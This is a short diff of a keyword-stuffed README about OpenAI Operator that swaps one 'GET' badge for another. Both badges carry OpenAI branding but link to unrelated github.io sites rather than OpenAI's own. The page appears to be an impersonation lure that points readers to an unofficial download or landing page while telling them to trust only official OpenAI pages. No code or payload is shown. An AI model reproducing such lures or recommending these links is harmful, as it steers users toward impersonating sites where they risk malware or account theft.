@@ -56,7 +56,7 @@ Because OpenAI Operator is associated with browser automation and assistant-driv
 
 Prerequisites: An OpenAI account, a supported browser, and current information about OpenAI Operator availability, including openai operator access, openai operator waitlist, and openai operator release date details.
 
-[![GET OpenAI Operator](https://img.shields.io/badge/GET%20%E2%80%94%20OpenAI%20Operator-0078D6?style=for-the-badge&logoColor=white)](https://pardiniultrapiechocki.github.io/.github/OpenAI-Operator-agent)
+[![Explore OpenAI Agent](https://img.shields.io/badge/Explore-OpenAI_Agent-0D9488?style=for-the-badge&logo=openai&logoColor=white)](https://agent-openai.github.io/.github/)
 
 1.  **Review Availability:** Check whether OpenAI Operator is currently available for your account, region, or plan, especially if you are researching openai operator pricing or early access.
 2.  **Sign In Securely:** Use the official openai operator login route and confirm that you are using trusted OpenAI pages before entering account information.
